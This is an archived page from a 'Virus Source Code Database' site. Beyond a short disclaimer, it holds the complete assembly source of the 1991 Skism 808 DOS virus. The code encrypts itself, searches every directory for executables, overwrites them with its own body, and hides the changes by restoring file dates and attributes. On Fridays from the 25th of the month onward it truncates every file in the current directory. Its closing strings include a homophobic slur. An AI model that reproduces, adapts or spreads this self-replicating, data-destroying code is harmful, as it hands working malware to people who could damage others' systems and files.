<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: 808_asm</title>
<meta name="KEYWORDS" content="808.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for 808.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="1000year_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1000year_asm.php">1000year_asm</a><br><a href="102_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/102_asm.php">102_asm</a><br><a href="1260__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1260__asm.php">1260__asm</a><br><a href="1260_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1260_asm.php">1260_asm</a><br><a href="133_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/133_asm.php">133_asm</a><br><a href="134_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/134_asm.php">134_asm</a><br><a href="1575_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1575_asm.php">1575_asm</a><br><a href="1575_e_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1575_e_asm.php">1575_e_asm</a><br><a href="1575-org_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1575-org_asm.php">1575-org_asm</a><br><a href="1701_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1701_asm.php">1701_asm</a><br><a href="1704__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1704__asm.php">1704__asm</a><br><a href="1704_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1704_asm.php">1704_asm</a><br><a href="1808_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1808_asm.php">1808_asm</a><br><a href="1888_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1888_asm.php">1888_asm</a><br><a href="1963_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1963_asm.php">1963_asm</a><br><a href="196_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/196_asm.php">196_asm</a><br><a href="1992_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1992_asm.php">1992_asm</a><br><a href="1ststar_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1ststar_asm.php">1ststar_asm</a><br><a href="1stvirus_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1stvirus_asm.php">1stvirus_asm</a><br><a href="203_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/203_asm.php">203_asm</a><br><a href="2249_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2249_asm.php">2249_asm</a><br><a href="2350_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2350_asm.php">2350_asm</a><br><a href="2400_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2400_asm.php">2400_asm</a><br><a href="2471_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2471_asm.php">2471_asm</a><br><a href="2501_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2501_asm.php">2501_asm</a><br><a href="2564_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2564_asm.php">2564_asm</a><br><a href="2626_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2626_asm.php">2626_asm</a><br><a href="2715_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2715_asm.php">2715_asm</a><br><a href="29bytes_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/29bytes_asm.php">29bytes_asm</a><br><a href="3066_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/3066_asm.php">3066_asm</a><br><a href="30_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/30_asm.php">30_asm</a><br><a href="334_b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/334_b_asm.php">334_b_asm</a><br><a href="334-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/334-b_asm.php">334-b_asm</a><br><a href="382_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/382_asm.php">382_asm</a><br><a href="405_a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/405_a_asm.php">405_a_asm</a><br><a href="405__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/405__asm.php">405__asm</a><br><a href="405_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/405_asm.php">405_asm</a><br><a href="405_b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/405_b_asm.php">405_b_asm</a><br><a href="4096a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/4096a_asm.php">4096a_asm</a><br><a href="4096____asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/4096____asm.php">4096____asm</a><br><a href="4096___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/4096___asm.php">4096___asm</a><br><a href="4096__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/4096__asm.php">4096__asm</a><br><a href="4096_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/4096_asm.php">4096_asm</a><br><a href="42bites_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/42bites_asm.php">42bites_asm</a><br><a href="44__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/44__asm.php">44__asm</a><br><a href="44_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/44_asm.php">44_asm</a><br><a href="45_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/45_asm.php">45_asm</a><br><a href="500_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/500_asm.php">500_asm</a><br><a href="5120_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/5120_asm.php">5120_asm</a><br><a href="512__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/512__asm.php">512__asm</a><br><a href="512_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/512_asm.php">512_asm</a><br><a href="512_e_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/512_e_asm.php">512_e_asm</a><br><a href="512-e_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/512-e_asm.php">512-e_asm</a><br><a href="512_f_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/512_f_asm.php">512_f_asm</a><br><a href="512-f_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/512-f_asm.php">512-f_asm</a><br><a href="534_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/534_asm.php">534_asm</a><br><a href="541__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/541__asm.php">541__asm</a><br><a href="541_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/541_asm.php">541_asm</a><br><a href="560_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/560_asm.php">560_asm</a><br><a href="578_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/578_asm.php">578_asm</a><br><a href="583_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/583_asm.php">583_asm</a><br><a href="583virus_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/583virus_asm.php">583virus_asm</a><br><a href="648_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/648_asm.php">648_asm</a><br><a href="7son_284_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7son_284_asm.php">7son_284_asm</a><br><a href="7son_332_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7son_332_asm.php">7son_332_asm</a><br><a href="7son426b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7son426b_asm.php">7son426b_asm</a><br><a href="7son-473_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7son-473_asm.php">7son-473_asm</a><br><a href="7son473b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7son473b_asm.php">7son473b_asm</a><br><a href="7th_son4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7th_son4_asm.php">7th_son4_asm</a><br><a href="7th_son__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7th_son__asm.php">7th_son__asm</a><br><a href="808__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/808__asm.php">808__asm</a><br><a href="808_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/808_asm.php">808_asm</a><br><a href="80hex_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/80hex_asm.php">80hex_asm</a><br><a href="90210_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/90210_asm.php">90210_asm</a><br></td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/a/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/a/index.php'" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/b/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/b/index.php'" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/c/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/c/index.php'" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/d/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/d/index.php'" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/e/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/e/index.php'" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/f/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/f/index.php'" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/g/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/g/index.php'" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/h/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/h/index.php'" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/i/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/i/index.php'" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/j/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/j/index.php'" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/k/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/k/index.php'" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/l/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/l/index.php'" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/m/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/m/index.php'" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/n/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/n/index.php'" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/o/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/o/index.php'" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/p/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/p/index.php'" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/q/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/q/index.php'" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/r/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/r/index.php'" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/s/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/s/index.php'" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/t/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/t/index.php'" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/u/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/u/index.php'" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/v/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/v/index.php'" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/w/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/w/index.php'" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/x/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/x/index.php'" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/y/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/y/index.php'" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/z/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/z/index.php'" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

;tHE sKISM 808 vIRUS.  cREATED 1991 BY sMART kIDS iNTO sICK mETHODS.



FILENAME   equ      30                 ;USED TO FIND FILE NAME
FILEATTR   equ      21                 ;USED TO FIND FILE ATTRIBUTES
FILEDATE   equ      24                 ;USED TO FIND FILE DATE
FILETIME   equ      22                 ;USED TO FIND FILE TIME



CODE_START equ      0100H              ;START OF ALL .com FILES
VIRUS_SIZE equ      808                ;tr 808


CODE     SEGMENT  'CODE'
ASSUME   CS:CODE,DS:CODE,ES:CODE
         ORG      CODE_START

MAIN PROC   NEAR

JMP    VIRUS_START

ENCRYPT_VAL    DB     00H

VIRUS_START:

     CALL     ENCRYPT                  ;ENCRYPT/DECRYPT FILE
     JMP      VIRUS                    ;GO TO START OF CODE

ENCRYPT:

     PUSH     CX
     MOV      BX,OFFSET VIRUS_CODE     ;START ENCRYPTION AT DATA

XOR_LOOP:

     MOV      CH,[BX]                  ;READ CURRENT BYTE
     XOR      CH,ENCRYPT_VAL           ;GET ENCRYPTION KEY
     MOV      [BX],CH                  ;SWITCH BYTES
     INC      BX                       ;MOVE BX UP A BYTE
     CMP      BX,OFFSET VIRUS_CODE+VIRUS_SIZE
                                       ;ARE WE DONE WITH THE ENCRYPTION
     JLE      XOR_LOOP                 ;NO?  KEEP GOING
     POP      CX
     RET


INFECTFILE:

     MOV     DX,CODE_START             ;WHERE VIRUS STARTS IN MEMORY
     MOV     BX,OFFSET HANDLE                 ;LOAD BX WITH HANDLE
     PUSH    BX                        ;SAVE HANDLE ON STACK
     CALL    ENCRYPT                   ;ENCRYPT FILE
     POP     BX                        ;GET BACK BX
     MOV     CX,VIRUS_SIZE             ;NUMBER OF BYTES TO WRITE
     MOV     AH,40H                    ;WRITE TO FILE
     INT     21H                       ;
     PUSH    BX
     CALL    ENCRYPT                   ;FIX UP THE MESS
     POP     BX
     RET

VIRUS_CODE:

WILDCARDS    DB     "*",0              ;SEARCH FOR DIRECTORY ARGUMENT
FILESPEC     DB     "*.exe",0          ;SEARCH FOR exe FILE ARGUMENT
FILESPEC2    DB     "*.*",0
ROOTDIR      DB     "\",0              ;ARGUMENT FOR ROOT DIRECTORY
DIRDATA      DB     43 DUP (?)         ;HOLDS DIRECTORY dta
FILEDATA     DB     43 DUP (?)         ;HOLDS FILES dta
DISKDTASEG   DW     ?                  ;HOLDS DISK DTA SEGMENT
DISKDTAOFS   DW     ?                  ;HOLDS DISK DTA OFFSET
TEMPOFS      DW     ?                  ;HOLDS OFFSET
TEMPSEG      DW     ?                  ;HOLDS SEGMENT
DRIVECODE    DB     ?                  ;HOLDS DRIVE CODE
CURRENTDIR   DB     64 DUP (?)         ;SAVE CURRENT DIRECTORY INTO THIS
HANDLE       DW     ?                  ;HOLDS FILE HANDLE
ORIG_TIME    DW     ?                  ;HOLDS FILE TIME
ORIG_DATE    DW     ?                  ;HOLDS FILE DATE
ORIG_ATTR    DW     ?                  ;HOLDS FILE ATTR
IDBUFFER     DW     2 DUP  (?)         ;HOLDS VIRUS ID

VIRUS:

      MOV    AX,3000H                  ;GET DOS VERSION
      INT    21H                       ;
      CMP    AL,02H                    ;IS IT AT LEAST 2.00?
      JB     BUS1                      ;WON'T INFECT LESS THAN 2.00
      MOV    AH,2CH                    ;GET TIME
      INT    21H                       ;
      MOV    ENCRYPT_VAL,DL            ;SAVE M_SECONDS TO ENCRYPT VAL SO
                                       ;THERES 100 MUTATIONS POSSIBLE
SETDTA:

     MOV     DX,OFFSET DIRDATA         ;OFFSET OF WHERE TO HOLD NEW DTA
     MOV     AH,1AH                    ;SET DTA ADDRESS
     INT     21H                       ;

NEWDIR:

     MOV     AH,19H                    ;GET DRIVE CODE
     INT     21H                       ;
     MOV     DL,AL                     ;SAVE DRIVECODE
     INC     DL                        ;ADD ONE TO DL, BECAUSE FUNCTIONS DIFFER
     MOV     AH,47H                    ;GET CURRENT DIRECTORY
     MOV     SI, OFFSET CURRENTDIR     ;BUFFER TO SAVE DIRECTORY IN
     INT     21H                       ;

     MOV     DX,OFFSET ROOTDIR         ;MOVE DX TO CHANGE TO ROOT DIRECTORY
     MOV     AH,3BH                    ;CHANGE DIRECTORY TO ROOT
     INT     21H                       ;

SCANDIRS:

     MOV     CX,13H                    ;INCLUDE HIDDEN/RO DIRECTORYS
     MOV     DX, OFFSET WILDCARDS      ;LOOK FOR '*'
     MOV     AH,4EH                    ;FIND FIRST FILE
     INT     21H                       ;
     CMP     AX,12H                    ;NO FIRST FILE?
     JNE     DIRLOOP                   ;NO DIRS FOUND? BAIL OUT

BUS1:

      JMP    BUS

DIRLOOP:

     MOV     AH,4FH                    ;FIND NEXT FILE
     INT     21H                       ;
     CMP     AX,12H
     JE      BUS                       ;NO MORE DIRS FOUND, ROLL OUT

CHDIR:

     MOV     DX,OFFSET DIRDATA+FILENAME;POINT DX TO FCB - FILENAME
     MOV     AH,3BH                    ;CHANGE DIRECTORY
     INT     21H                       ;

     MOV     AH,2FH                    ;GET CURRENT DTA ADDRESS
     INT     21H                       ;
     MOV     [DISKDTASEG],ES           ;SAVE OLD SEGMENT
     MOV     [DISKDTAOFS],BX           ;SAVE OLD OFFSET
     MOV     DX,OFFSET FILEDATA        ;OFFSET OF WHERE TO HOLD NEW DTA
     MOV     AH,1AH                    ;SET DTA ADDRESS
     INT     21H                       ;

SCANDIR:

     MOV     CX,07H                    ;FIND ANY ATTRIBUTE
     MOV     DX,OFFSET FILESPEC        ;POINT DX TO "*.com",0
     MOV     AH,4EH                    ;FIND FIRST FILE FUNCTION
     INT     21H                       ;
     CMP     AX,12H                    ;WAS FILE FOUND?
     JNE     TRANSFORM

NEXTEXE:

     MOV     AH,4FH                    ;FIND NEXT FILE
     INT     21H                       ;
     CMP     AX,12H                    ;NONE FOUND
     JNE     TRANSFORM                 ;FOUND SEE WHAT WE CAN DO

     MOV     DX,OFFSET ROOTDIR         ;MOVE DX TO CHANGE TO ROOT DIRECTORY
     MOV     AH,3BH                    ;CHANGE DIRECTORY TO ROOT
     INT     21H                       ;
     MOV     AH,1AH                    ;SET DTA ADDRESS
     MOV     DS,[DISKDTASEG]           ;RESTORE OLD SEGMENT
     MOV     DX,[DISKDTAOFS]           ;RESTORE OLD OFFSET
     INT     21H                       ;
     JMP     DIRLOOP


BUS:

     JMP     ROLLOUT

TRANSFORM:

     MOV     AH,2FH                    ;TEMPORALLY STORE DTA
     INT     21H                       ;
     MOV     [TEMPSEG],ES              ;SAVE OLD SEGMENT
     MOV     [TEMPOFS],BX              ;SAVE OLD OFFSET
     MOV     DX, OFFSET FILEDATA + FILENAME

     MOV     BX,OFFSET FILEDATA               ;SAVE FILE...
     MOV     AX,[BX]+FILEDATE          ;DATE
     MOV     ORIG_DATE,AX              ;
     MOV     AX,[BX]+FILETIME          ;TIME
     MOV     ORIG_TIME,AX              ;    AND
     MOV     AX,[BX]+FILEATTR          ;
     MOV     AX,4300H
     INT     21H
     MOV     ORIG_ATTR,CX
     MOV     AX,4301H                  ;CHANGE ATTRIBUTES
     XOR     CX,CX                     ;CLEAR ATTRIBUTES
     INT     21H                       ;
     MOV     AX,3D00H                  ;OPEN FILE - READ
     INT     21H                       ;
     JC      FIXUP                     ;ERROR - FIND ANOTHER FILE
     MOV     HANDLE,AX                 ;SAVE HANDLE
     MOV     AH,3FH                    ;READ FROM FILE
     MOV     BX,OFFSET HANDLE               ;MOVE HANDLE TO BX
     MOV     CX,02H                    ;READ 2 BYTES
     MOV     DX,OFFSET IDBUFFER        ;SAVE TO BUFFER
     INT     21H                       ;

     MOV     AH,3EH                    ;CLOSE FILE FOR NOW
     MOV     BX,OFFSET HANDLE               ;LOAD BX WITH HANDLE
     INT     21H                       ;

     MOV     BX, IDBUFFER              ;FILL BX WITH ID STRING
     CMP     BX,02EBH                  ;INFECTED?
     JNE     DOIT                      ;SAME - FIND ANOTHER FILE


FIXUP:
     MOV     AH,1AH                    ;SET DTA ADDRESS
     MOV     DS,[TEMPSEG]              ;RESTORE OLD SEGMENT
     MOV     DX,[TEMPOFS]              ;RESTORE OLD OFFSET
     INT     21H                       ;
     JMP     NEXTEXE


DOIT:

     MOV     DX, OFFSET FILEDATA + FILENAME
     MOV     AX,3D02H                  ;OPEN FILE READ/WRITE ACCESS
     INT     21H                       ;
     MOV     HANDLE,AX                 ;SAVE HANDLE

     CALL    INFECTFILE

     ;MOV     AX,3EH                    ;CLOSE FILE
     ;INT     21H

ROLLOUT:

     MOV     AX,5701H                  ;RESTORE ORIGINAL
     MOV     BX,OFFSET HANDLE                 ;
     MOV     CX,ORIG_TIME              ;TIME AND
     MOV     DX,ORIG_DATE              ;DATE
     INT     21H                       ;

     MOV     AX,4301H                  ;RESTORE ORIGINAL ATTRIBUTES
     MOV     CX,ORIG_ATTR
     MOV     DX,OFFSET FILEDATA + FILENAME
     INT     21H
     MOV     BX,OFFSET HANDLE
     MOV     AX,3EH                   ;CLOSE FILE
     INT     21H
     MOV     AH,3BH                    ;TRY TO FIX THIS
     MOV     DX,OFFSET ROOTDIR         ;FOR SPEED
     INT     21H                       ;
     MOV     AH,3BH                    ;CHANGE DIRECTORY
     MOV     DX,OFFSET CURRENTDIR      ;BACK TO ORIGINAL
     INT     21H                       ;
     MOV     AH,2AH                    ;CHECK SYSTEM DATE
     INT     21H                       ;
     CMP     CX,1991                   ;IS IT AT LEAST 1991?
     JB      AUDI                      ;NO? DON'T DO IT NOW
     CMP     DL,25                     ;IS IT THE 25TH?
     JB      AUDI                      ;NOT YET? QUIT
     CMP     AL,5                      ;IS fRIDAY?
     JNE     AUDI                      ;NO? QUIT
     MOV     DX,OFFSET DIRDATA         ;OFFSET OF WHERE TO HOLD NEW DTA
     MOV     AH,1AH                    ;SET DTA ADDRESS
     INT     21H                       ;
     MOV     AH,4EH                    ;FIND FIRST FILE
     MOV     CX,7H                     ;
     MOV     DX,OFFSET FILESPEC2       ;OFFSET *.*

lOOPS:

     INT     21H                       ;
     JC      AUDI                      ;ERROR? THEN QUIT
     MOV     AX,4301H                  ;FIND ALL NORMAL FILES
     XOR     CX,CX                     ;
     INT     21H                       ;
     MOV     DX,OFFSET DIRDATA + FILENAME
     MOV     AH,3CH                    ;FUCK UP ALL FILES IN CURRENT DIR
     INT     21H                       ;
     JC      AUDI                      ;ERROR? QUIT
     MOV     AH,4FH                    ;FIND NEXT FILE
     JMP     LOOPS                     ;

AUDI:

     MOV     AX,4C00H                  ;END PROGRAM
     INT     21H                       ;

;tHE BELOW IS JUST TEXT TO PAD OUT THE VIRUS SIZE TO 808 BYTES.  dON'T
;JUST CHANGE THE TEXT AND CLAIM THAT THIS IS YOUR CREATION.


WORDS_   DB   "sKISM rYTHEM sTACK vIRUS-808. sMART kIDS iNTO sICK mETHODS",0
WORDS2   DB   "  dONT ALTER THIS CODE INTO YOUR OWN STRAIN, FAGGIT.      ",0
